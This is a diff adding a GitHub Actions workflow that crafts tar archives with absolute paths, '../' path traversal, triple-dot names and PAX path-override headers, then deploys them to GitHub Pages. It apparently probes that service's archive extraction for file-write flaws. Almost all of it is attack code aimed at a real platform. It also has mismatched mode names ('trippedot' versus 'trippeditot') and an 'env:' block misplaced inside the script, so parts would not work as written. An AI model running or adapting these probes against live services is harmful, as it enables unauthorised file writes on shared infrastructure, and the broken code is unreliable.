@@ -1,0 +1,60 @@
+name: Crafted tar probe 3 (bisect)
+on:
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: 'ctrl | abs | trav | pax | dotdot4 | trippedot'
+        required: true
+permissions:
+  contents: read
+  pages: write
+  id-token: write
+concurrency:
+  group: "pages"
+  cancel-in-progress: false
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment:
+      name: github-pages
+      url: ${{ steps.deployment.outputs.page_url }}
+    steps:
+      - name: Craft tar by mode
+        run: |
+          python3 - <<'PY'
+          import tarfile, time, io, os
+          mode = os.environ['MODE']
+          ts = int(time.time())
+          fmt = tarfile.PAX_FORMAT if mode == 'pax' else tarfile.GNU_FORMAT
+          t = tarfile.open('artifact.tar', 'w', format=fmt)
+          def addfile(name, data=b'', pax=None):
+              ti = tarfile.TarInfo(name)
+              ti.size = len(data)
+              ti.mode = 0o644
+              if pax: ti.pax_headers = pax
+              t.addfile(ti, io.BytesIO(data))
+          addfile('index.html', ('<!DOCTYPE html><html><body><h1>craft3 %s %d</h1></body></html>' % (mode, ts)).encode())
+          if mode == 'abs':
+              addfile('/abs3-%d.html' % ts, b'<!DOCTYPE html><h1>ABS3</h1>')
+          elif mode == 'trav':
+              addfile('trav3/../../observable-trav3-%d.html' % ts, b'<!DOCTYPE html><h1>TRAV3</h1>')
+          elif mode == 'dotdot4':
+              addfile('d/e/f/g/../../../../up4-%d.html' % ts, b'<!DOCTYPE html><h1>UP4</h1>')
+          elif mode == 'trippeditot':
+              addfile('.../triple-dot-%d.html' % ts, b'<!DOCTYPE html><h1>TRIPLEDOT</h1>')
+          elif mode == 'pax':
+              addfile('benign-looking-%d.html' % ts, b'<!DOCTYPE html><h1>PAXOVERRIDE</h1>', pax={'path': 'pax-override-%d.html' % ts})
+          t.close()
+          open('ts.txt','w').write(str(ts))
+          print('mode', mode, 'ts', ts)
+          PY
+          env:
+            MODE: ${{ inputs.mode }}
+          # also write files to workspace for artifact path
+      - run: cat ts.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: github-pages
+          path: artifact.tar
+      - uses: actions/deploy-pages@v4
+        id: deployment
